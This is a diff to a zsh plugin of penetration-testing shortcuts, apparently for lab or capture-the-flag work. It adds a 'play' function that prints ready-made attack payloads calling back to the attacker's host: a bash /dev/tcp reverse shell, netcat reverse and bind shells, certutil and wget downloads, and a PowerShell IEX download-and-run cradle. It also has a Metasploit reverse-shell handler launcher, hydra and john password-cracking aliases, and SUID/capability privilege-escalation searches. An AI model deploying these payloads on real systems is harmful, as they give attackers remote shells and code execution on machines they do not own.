@@ -14,31 +14,43 @@ export SECLISTS="/usr/share/wordlists/seclists"
 # ALIASES
 #
 
-#alias s='sync'
-alias f='focus'
-alias hcat='h-hashcat'
-alias hcatshow='hashcat --show'
-alias hi='h-init'
-alias hrock='hydra -VI -P $LIST_ROCK'
-alias jrock='john --wordlist=$LIST_ROCK'
-alias jshow='john --show'
+alias f="focus"
+alias hcat="h-hashcat"
+alias hcatshow="hashcat --show"
+alias hi="h-init"
+alias hrock="hydra -VI -P $LIST_ROCK"
+alias jrock="john --wordlist=$LIST_ROCK"
+alias jshow="john --show"
 alias msf=msfconsole
 alias ngrok="/opt/ngrok http 80"
-alias sshclean='ssh-keygen -R rhost'
+alias p="~/.oh-my-zsh/custom/plugins/tg-hacker/play.py"
+alias s='sync'
+alias sshclean="ssh-keygen -R rhost; ssh"
 alias t1="tree -L 1"
 alias t2="tree -L 2"
 alias t3="tree -L 3"
-alias ve='me tun0'
-alias vpn='sudo -b openvpn'
-alias vpnkill='sudo pkill openvpn'
-alias vpnshow='pgrep -a openvpn'
+alias ve="me tun0"
+alias vpn="sudo -b openvpn"
+alias vpnkill="sudo pkill openvpn"
+alias vpnshow="pgrep -a openvpn"
+alias xc="xclip -sel c"
+
+
+#
+# FIND
+#
+
+alias find-cap="getcap -r / 2>/dev/null"
+alias find-sgid="find / -type f -perm -2000 -ls 2>/dev/null"
+alias find-sguid="find / -type f -perm /6000 -ls 2>/dev/null"
+alias find-sudo="sudo -l"
+alias find-suid="find / -type f -perm -4000 -ls 2>/dev/null"
 
 #
 # GREP
 #
 
-alias grep-email='grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"'
-
+alias grep-email="grep -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b'"
 
 #
 # FUNCTIONS
@@ -67,7 +79,6 @@ clip() {
     cat $FILE | xclip -selection c
 }
 
-
 # Select target ip:port
 focus() {
     IP=${1:-"EMPTY"}
@@ -85,12 +96,36 @@ focus() {
 }
 
 play() {
-    CMD=${1:-"info"}
-    if [[ $CMD == "info" ]]; then
-        cat ~/.oh-my-zsh/custom/plugins/tg-hacker/commands | cut -d "#" -f 1
-        return
+    payloads=( \
+        "bash" \
+        "certutil" \
+        "netcat-bind" \
+        "netcat-rev" \
+        "ps_download" \
+        "ps_downx" \
+        "wget"\
+    )
+
+    if [ "$@" ]; then
+        payload="$1"
+    else
+        select payload in ${payloads[@]}; do
+            payload=$payload
+            break;
+        done
     fi
-    eval $(grep "$CMD" ~/.oh-my-zsh/custom/plugins/tg-hacker/commands | cut -d "#" -f 2 )
+
+    case "$payload" in
+        bash) echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" ;;
+        certutil) echo "certutil -urlcache -split -f http://$LHOST/" ;;
+        netcat-bind) echo "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/" ;;
+        netcat-rev)  echo "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f" ;;
+        ps_download) echo "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/','')\"" ;;
+        ps_downx) echo "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/shell.ps1')\"" ;;
+        wget) echo "wget http://$LHOST:80/" ;;
+        *)          
+            echo "NOPE" ;;
+    esac
 } 
 
 # Set local callback port
@@ -104,8 +139,14 @@ lport() {
 }
 
 listen() {
-    [[ -z $LPORT ]] || lport
-    nc -lvnp $LPORT
+    [[ -n $LPORT ]] || lport
+    if [[ -z "$1" ]]; then
+        echo "normal"
+        nc -lvnp $LPORT
+    else
+        echo "rlwrap"
+        rlwrap nc -lvnp $LPORT
+    fi
 }
 
 # Get ip address of local interface default: eth0
@@ -140,13 +181,12 @@ serve() {
 
 # Sync env variables from $CONF file
 sync() {
-    if [[ ! -f $CONF ]]; then
-        h-init
-    fi
-    cat $CONF
+    [[ -f $CONF ]] ||  h-init
     . $CONF
     . ~/.oh-my-zsh/custom/plugins/tg-hacker/tg-hacker.plugin.zsh
     cd $BASE
+    clear
+    [[ "$1" == "-v" ]] && cat $CONF
 }
 
 #
@@ -159,15 +199,13 @@ h-init() {
     [[ -d $BASE ]] || mkdir -p $BASE
     cd $BASE
     BASE=$(pwd)
-    echo "#!/usr/bin/env zsh" > $CONF 
+    sed -i "/^BASE=/d" $CONF
     echo "BASE=$BASE" >> $CONF
-    echo "export LPORT=4444" >> $CONF
-    ve
     touch notes.txt
 }
 
 h-enum4linux() {
-    OUTPUT=enum4linux.$RHOST
+    OUTPUT="enum4linux.$RHOST"
     enum4linux-ng $RHOST -oA $OUTPUT 
 }
 
@@ -218,29 +256,107 @@ h-ssh() {
 h-web() {
     PORT=${1:-80}
     IP=${2:-$RHOST}
-    OUTPUT=nikto.txt
+    OUTPUT=$IP.nikto.txt
     touch $OUTPUT
-    whatweb -v -a 3 "$IP:$PORT" | tee whatweb.txt 
+    whatweb -v -a 3 "$IP:$PORT" | tee $IP.whatweb.txt 
     nikto -host "$IP" -port "$PORT" -output $OUTPUT -Format txt
 }
+
+#
+# METASPLOIT
+#
+
+msf-handle() {
+    payloads=( \
+        "linux/x64/meterpreter/reverse_tcp" \
+        "linux/x64/shell_reverse_tcp" \
+        "linux/x86/meterpreter/reverse_tcp" \
+        "linux/x86/shell_reverse_tcp" \
+        "windows/meterpreter/reverse_tcp" \
+        "windows/x64/meterpreter/reverse_tcp" \
+    )
+
+    select PAYLOAD in "${payloads[@]}"; do
+        echo "msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;'"
+        msfconsole -x "use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;"
+        break;
+    done
+}
+
 
 #
 # NMAP
 #
 
-alias nmap-="sudo nmap -v -Pn -n -T4"
-alias nmap-arp="sudo nmap -v -n -sn -PR"
-alias nmap-basic-all="sudo nmap -v -Pn -n -T4 -p- -oN nmap.basic.all.txt"
-alias nmap-basic="sudo nmap -v -Pn -n -T4 -oN nmap.basic.txt"
-alias nmap-discover="sudo nmap -v -sn"
-alias nmap-full-all="sudo nmap -v -n -T4 -A -p- -oN nmap.full.all.txt"
-alias nmap-full="sudo nmap -v -n -T4 -A -oN nmap.full.txt"
-alias nmap-script-all="sudo nmap -v -Pn -n -T4 -sC -sV -p- -oN nmap.script.all.txt"
-alias nmap-script="sudo nmap -v -Pn -n -T4 -sC -sV -oN nmap.script.txt"
+alias nmap-="sudo nmap -v -n -Pn -T4"
+#alias nmap-arp="sudo nmap -v -n -sn -PR"
+#alias nmap-basic-all="sudo nmap -v -n -Pn -T4 -p- -oN nmap.basic.all.txt"
+#alias nmap-basic="sudo nmap -v -n -Pn -T4 -oN nmap.basic.txt"
+#alias nmap-discover="sudo nmap -v -n -T4 -sn -PE -oN"
+#alias nmap-discover="sudo nmap -v -sn"
+#alias nmap-full-all="sudo nmap -v -n -T4 -A -p- -oN nmap.full.all.txt"
+#alias nmap-full="sudo nmap -v -n -T4 -A -oN nmap.full.txt"
+#alias nmap-script-all="sudo nmap -v -n -Pn -T4 -sC -sV -p- -oN nmap.script.all.txt"
+#alias nmap-script="sudo nmap -v -n -Pn -T4 -sC -sV -oN nmap.script.txt"
+
+#nmap- () { sudo nmap -v -n -Pn -T4 ${1:-$RHOST} }
+nmap-arp()        { sudo nmap -v -n -sn -PR              -oN ${1:-$RHOST}-nmap-arp.txt ${1:-$RHOST} }
+nmap-basic()      { sudo nmap -v -n -Pn -T4              -oN ${1:-$RHOST}-nmap-basic.txt ${1:-$RHOST} }
+nmap-basic-all()  { sudo nmap -v -n -Pn -T4 -p-          -oN ${1:-$RHOST}-nmap-basic-all.txt ${1:-$RHOST} }
+nmap-discover()   { sudo nmap -v -n -T4 -sn -PE          -oN ${1:-$RHOST}-nmap-discover.txt ${1:-$RHOST} }
+nmap-full()       { sudo nmap -v -n -Pn -T4 -A           -oN ${1:-$RHOST}-nmap-full.txt ${1:-$RHOST} }
+nmap-full-all()   { sudo nmap -v -n -Pn -T4 -A -p-       -oN ${1:-$RHOST}-nmap.full.all.txt ${1:-$RHOST} }
+nmap-script()     { sudo nmap -v -n -Pn -T4 -sC -sV      -oN ${1:-$RHOST}-nmap.script.txt ${1:-$RHOST} }
+nmap-script-all() { sudo nmap -v -n -Pn -T4 -sC -sV -p-  -oN ${1:-$RHOST}-nmap.script.all.txt ${1:-$RHOST} }
+
+nmapper(){
+    local ACTION
+    local TARGET
+
+    local base="sudo nmap -v -n -Pn -T4"
+
+    PARAMS=""
+    while :; do
+        case "$1" in
+            -a|--action)
+                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
+                    ACTION=$2
+                    shift 2
+                else
+                    exit 1
+                    echo "Error: Argument for $1 is missing" >&2
+                fi
+                ;;
+            -t|--target)
+                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
+                    TARGET=$2
+                    shift 2
+                else
+                    exit 1
+                    echo "Error: Argument for $1 is missing" >&2
+                fi
+                ;;
+            -*|--*=) # unsupported flags
+                echo "Error: Unsupported flag $1" >&2
+                exit 1
+                ;;
+            *) # preserve positional arguments
+                PARAMS="$PARAMS $1"
+                shift
+                ;;
+        esac
+    done
+    # set positional arguments in their proper place
+    eval set -- "$PARAMS"
+
+    echo "$ACTION $TARGET"
+
+
+}
 
 nmap-ports(){
     IP=${1:-"$RHOST"}
-    sudo nmap -v -Pn -T4 -oN nmap.ports.txt $IP 
+    sudo nmap -v -Pn -T4 -oN nmap-ports.txt $IP 
     nmap-parse-ports
 }
 
@@ -252,15 +368,3 @@ nmap-parse-ports() {
     echo "RPORTS=$RPORTS"
 }
 
-#
-# METASPLOIT
-#
-
-msf-handle() {
-    payloads=("linux/x64/meterpreter/reverse_tcp" "linux/x64/shell_reverse_tcp" "linux/x86/meterpreter/reverse_tcp" "linux/x86/shell_reverse_tcp" "windows/meterpreter/reverse_tcp" "windows/x64/meterpreter/reverse_tcp")
-    select PAYLOAD in "${payloads[@]}"; do
-        echo "msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;'"
-        msfconsole -x "use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;"
-        break;
-    done
-}
